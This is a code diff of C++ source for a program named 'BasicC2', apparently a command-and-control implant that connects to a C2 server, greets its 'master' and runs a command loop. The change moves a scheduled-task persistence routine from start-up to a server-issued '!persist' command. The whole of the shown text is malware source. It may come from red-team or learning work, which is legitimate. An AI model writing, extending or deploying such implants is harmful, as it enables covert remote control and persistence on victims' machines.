@@ -194,11 +194,7 @@ int __cdecl main(int argc, char** argv)
 
     cout << "[i] sending initial message to C2 server" << endl;
     // Send an initial message
-    sendMsg(ConnectSocket, "\nHello master, I am your BasicC2.");
-
-    cout << "[i] trying to get persistance via schedule tasks" << endl;
-    cmdOut = persistance();
-    sendMsg(ConnectSocket, "\nI tried to make myself persistent, here is the output:\n" + cmdOut + prompt);
+    sendMsg(ConnectSocket, "\nHello master, I am your BasicC2."+prompt);
     cout << "[i] waiting for commands from server" << endl;
 
     // main functional loop:
@@ -211,6 +207,12 @@ int __cdecl main(int argc, char** argv)
         {
             cout << "[!] connection not valid anymore, time to quit" << endl;
             break;
+        }
+        else if (cmd.find("!persist") != std::string::npos)
+        {
+            cout << "[i] trying to get persistance via schedule tasks" << endl;
+            cmdOut = persistance();
+            sendMsg(ConnectSocket, "I tried to make myself persistent, here is the output:\n" + cmdOut + prompt);
         }
         else
         {
